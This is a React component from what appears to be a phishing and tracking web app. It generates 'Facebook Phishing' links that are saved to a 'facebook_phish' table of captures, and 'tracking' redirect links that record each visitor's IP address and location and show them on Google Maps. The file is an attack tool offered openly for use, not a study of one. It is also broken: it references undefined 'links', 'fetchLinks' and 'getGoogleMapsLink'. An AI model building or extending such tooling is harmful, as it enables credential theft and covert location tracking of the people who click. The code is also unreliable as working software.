import React, { useState } from 'react';
import { supabase } from '../supabase';

export default function LinkGenerator({ onNewLink, onlyFacebook }) {
  const [link, setLink] = useState('');
  const [destino, setDestino] = useState('');
  const [erro, setErro] = useState('');
  const [tipo, setTipo] = useState(onlyFacebook ? 'facebook' : 'location'); // 'location' ou 'facebook'
  const usuario = localStorage.getItem('usuario');

  // Se onlyFacebook, sempre força tipo facebook
  if (onlyFacebook && tipo !== 'facebook') setTipo('facebook');

  async function gerarLink() {
    setErro('');
    const id = Math.random().toString(36).substring(2, 10);
    let url = '';
    if (tipo === 'location') {
      if (!destino || !/^https?:\/\//.test(destino)) {
        setErro('Enter a valid destination URL (e.g. https://globo.com)');
        return;
      }
      url = 'https://redirect-online.vercel.app/redirect/' + id;
      setLink(url);
      const { error } = await supabase.from('links').insert([
        { id, url, destino, acessos: [], email: usuario }
      ]);
      if (error) {
        setErro('Error saving link: ' + error.message);
        console.error('Supabase insert error:', error);
        return;
      }
    } else if (tipo === 'facebook') {
      url = 'https://redirect-online.vercel.app/facebook/' + id;
      setLink(url);
      const { error } = await supabase.from('facebook_phish').insert([
        { id, url, capturas: [], email: usuario }
      ]);
      if (error) {
        setErro('Error saving phishing link: ' + error.message);
        console.error('Supabase insert error:', error);
        return;
      }
    }
    if (onNewLink) onNewLink();
  }

  return (
    <div style={{ margin: '2rem 0', textAlign: 'center', width: '100%' }}>
      {!onlyFacebook && (
        <div style={{ marginBottom: 12 }}>
          <label>
            <input type="radio" checked={tipo === 'location'} onChange={() => setTipo('location')} /> Location Link
          </label>
          <label style={{ marginLeft: 16 }}>
            <input type="radio" checked={tipo === 'facebook'} onChange={() => setTipo('facebook')} /> Facebook Phishing
          </label>
        </div>
      )}
      {tipo === 'location' && !onlyFacebook && (
        <input
          type="text"
          placeholder="Destination URL (e.g. https://globo.com)"
          value={destino}
          onChange={e => setDestino(e.target.value)}
          style={{
            padding: '0.5rem 1rem',
            borderRadius: 8,
            border: '1px solid var(--cinza-conspiracao)',
            marginRight: 10,
            width: 320,
            maxWidth: '90vw',
            fontSize: 16
          }}
        />
      )}
      <button onClick={gerarLink} style={{
        background: 'var(--vermelho)',
        color: '#fff',
        border: 'none',
        borderRadius: 10,
        padding: '0.7rem 1.7rem',
        fontSize: '1rem',
        fontFamily: 'Inter',
        fontWeight: 600,
        boxShadow: '0 2px 8px 0 #E6003322',
        transition: 'box-shadow 0.2s, background 0.2s',
        marginTop: 8
      }}>{onlyFacebook ? 'Generate Facebook link' : (tipo === 'location' ? 'Generate tracking link' : 'Generate Facebook phishing link')}</button>
      {erro && <div style={{ color: 'var(--erro)', marginTop: 8 }}>{erro}</div>}
      {link && (
        <div style={{ marginTop: 20 }}>
          <span style={{ color: 'var(--ouro-tentacao)' }}>Your link:</span><br />
          <a href={link} target="_blank" rel="noopener noreferrer" style={{ fontSize: 18 }}>{link}</a>
        </div>
      )}
      <h3 style={{ color: 'var(--ouro-tentacao)', textAlign: 'center', margin: '1.5rem 0 1rem 0', width: '100%' }}>Your tracking links</h3>
      {links.length === 0 && (
        <p style={{ color: 'var(--cinza-conspiracao)', textAlign: 'center', margin: '0 0 1.5rem 0', width: '100%' }}>
          No links created yet.
        </p>
      )}
      {links.map(link => (
        <div key={link.id} className="card-glass" style={{
          margin: '1rem 0',
          padding: '1rem',
        }}>
          <div style={{ marginBottom: 8 }}>
            <b style={{ color: 'var(--ouro-tentacao)' }}>{link.url}</b>
          </div>
          <div style={{ fontSize: 14, color: 'var(--cinza-conspiracao)' }}>
            {(!link.acessos || link.acessos.length === 0) ? 'No access yet.' : `${link.acessos.length} access(es):`}
          </div>
          {link.acessos && link.acessos.length > 0 && (
            <ul style={{ margin: '0.5rem 0 0 0', padding: 0, listStyle: 'none' }}>
              {link.acessos.map((a, i) => {
                const gmaps = getGoogleMapsLink(a.loc);
                return (
                  <li key={i} style={{
                    background: 'rgba(255,143,163,0.08)',
                    borderRadius: 6,
                    margin: '0.25rem 0',
                    padding: '0.5rem',
                    color: 'var(--branco-confissao)'
                  }}>
                    <div><b>Date:</b> {a.data}</div>
                    <div><b>IP:</b> {a.ip}</div>
                    <div><b>Location:</b> {a.loc || 'Unknown'}</div>
                    {gmaps && (
                      <a
                        href={gmaps}
                        target="_blank"
                        rel="noopener noreferrer"
                        style={{
                          display: 'inline-block',
                          marginTop: 6,
                          background: 'var(--vermelho-paixao)',
                          color: 'var(--branco-confissao)',
                          borderRadius: 6,
                          padding: '0.3rem 1rem',
                          fontWeight: 'bold',
                          textDecoration: 'none',
                          fontSize: 14
                        }}
                      >View on Google Maps</a>
                    )}
                  </li>
                );
              })}
            </ul>
          )}
        </div>
      ))}
      <button
        onClick={fetchLinks}
        style={{
          display: 'block',
          margin: '0 auto 1.5rem auto',
          background: 'var(--cinza-conspiracao)',
          color: 'var(--branco-confissao)',
          borderRadius: 8,
          padding: '0.5rem 1.5rem',
          fontFamily: 'Montserrat',
          fontWeight: 'bold',
          fontSize: '1rem',
          border: 'none',
          cursor: 'pointer',
          marginTop: 10
        }}
      >
        Refresh list
      </button>
    </div>
  );
}